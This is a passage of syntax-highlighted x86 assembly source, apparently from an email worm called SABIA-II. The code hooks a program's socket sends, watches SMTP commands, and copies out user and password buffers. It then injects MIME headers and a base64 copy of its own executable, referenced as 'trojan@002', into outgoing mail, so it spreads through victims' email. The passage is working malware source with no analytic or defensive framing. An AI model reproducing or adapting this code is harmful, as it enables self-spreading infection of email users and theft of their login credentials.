   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">':OT '</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">buffer_rcpt</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'TPCR'</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">

   </span><span class="sc5">cp_rcpt</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'&gt;'</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">rcpt_cped</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cp_rcpt</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc1">;   our rcpt string is not complete, erase this buffer</span><span class="sc0">

   </span><span class="sc5">get_rcpt_str_rev</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">std</span><span class="sc0">
   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'TPCR'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">get_rcpt_str_rev</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc5">rcpt_cped</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc5">chk_quit</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;********************************************************************************</span><span class="sc0">
   </span><span class="sc1">;  time to check if our email thread is installed</span><span class="sc0">

   </span><span class="sc1">;  1- if not, install it</span><span class="sc0">
   </span><span class="sc1">;  2- if yes, quit</span><span class="sc0">

   </span><span class="sc1">;not implemented yet</span><span class="sc0">
   </span><span class="sc1">;********************************************************************************</span><span class="sc0">


   </span><span class="sc5">show</span><span class="sc0"> </span><span class="sc12">'1'</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_socket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc5">waiting4email</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">buffer_mail</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'LIAM'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">chk_quit_bye</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">buffer_rcpt</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'TPCR'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">chk_quit_bye</span><span class="sc0">

   </span><span class="sc5">show</span><span class="sc0"> </span><span class="sc12">'2'</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">buffer_mail</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;   size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">;   offset</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">buffer_rcpt</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">

   </span><span class="sc5">show</span><span class="sc0"> </span><span class="sc12">'3'</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">include_header_pass</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0a0d0a0dh</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'ATAD'</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'mail'</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_exe_name</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">exe_name</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">':mor'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'Fuck'</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">MAX_PATH</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc1">; Subject: </span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'subj'</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_exe_name</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">exe_name</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">':tce'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'jbuS'</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
   </span><span class="sc6">stosw</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_pass</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">MAX_PATH</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc1">; edi = global</span><span class="sc0">
   </span><span class="sc1">; esi = exe_name</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'atta'</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_exe_name</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini_f1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">

   </span><span class="sc1">; sending file name</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini_f2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini_f1</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini_f1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc5">show</span><span class="sc0"> </span><span class="sc12">'4'</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrlen</span><span class="sc0">

   </span><span class="sc1">; fname again</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini_f3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini_f2</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini_f2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc1">; time to send SABIA-II EXE in base64 format</span><span class="sc0">

   </span><span class="sc5">show</span><span class="sc0"> </span><span class="sc12">'5'</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@002</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trojan@002</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

   </span><span class="sc5">show</span><span class="sc0"> </span><span class="sc12">'6'</span><span class="sc0">

   </span><span class="sc1">; send last part of header and exit</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini_f4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini_f3</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">q_mime_ini_f3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_send</span><span class="sc0">

</span><span class="sc1">;   call my_recv</span><span class="sc0">

   </span><span class="sc5">chk_quit_bye</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">   </span><span class="sc1">;   number of buffers to NULL</span><span class="sc0">

   </span><span class="sc5">fuck_buffer</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">fuck_buffer</span><span class="sc0">

   </span><span class="sc5">show</span><span class="sc0"> </span><span class="sc12">'7'</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc5">chk_data</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_socket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc5">chk_user</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">buffer_user</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">recv_buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">buffer_user</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">

   </span><span class="sc5">cp_user</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cp_user_x</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">cp_user</span><span class="sc0">

   </span><span class="sc5">cp_user_x</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc5">chk_pass</span><span class="sc4">:</span><span class="sc0">   

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">ret_send</span><span class="sc0">

   </span><span class="sc5">buffer_pass</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">buffer_rcpt</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">global_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">buffer_pass</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
